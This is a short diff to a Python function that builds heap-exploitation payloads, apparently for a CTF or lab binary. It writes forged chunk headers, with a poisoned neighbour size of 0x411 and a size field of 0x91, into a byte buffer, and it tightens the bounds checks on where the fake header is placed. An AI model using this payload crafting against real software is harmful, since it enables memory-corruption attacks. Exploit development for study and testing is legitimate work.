@@ -220,14 +220,17 @@ def claim_content(size, hdr=None, nsize=None):
             os.environ.get('POISON_NEIGH_HDR', '0x410'), 0)
         ns = nsize if nsize is not None else int(
             os.environ.get('POISON_NEIGH_SIZE', '0x411'), 0)
-        if base + 0x10 > size:
-            base = size - 0x10
+        if base < 0x10 or base > size:
+            base = max(0x10, min(base, size))
         c = bytearray(b'Z' * size)
         c[0:16] = head
         c[base - 0x10:base - 0x08] = p64(0)
         c[base - 0x08:base] = p64(ns)
-        c[base:base + 8] = head[:8]
-        c[base + 8:base + 0x10] = head[8:]
+        n = min(8, size - base)
+        c[base:base + n] = head[:n]
+        k = base + 8
+        n = min(8, max(0, size - k))
+        c[k:k + n] = head[8:8 + n]
         return bytes(c)
     if size >= 864:
         return (b'Z' * 848 + p64(0) + p64(0x91) + b'Z' * (size - 864))
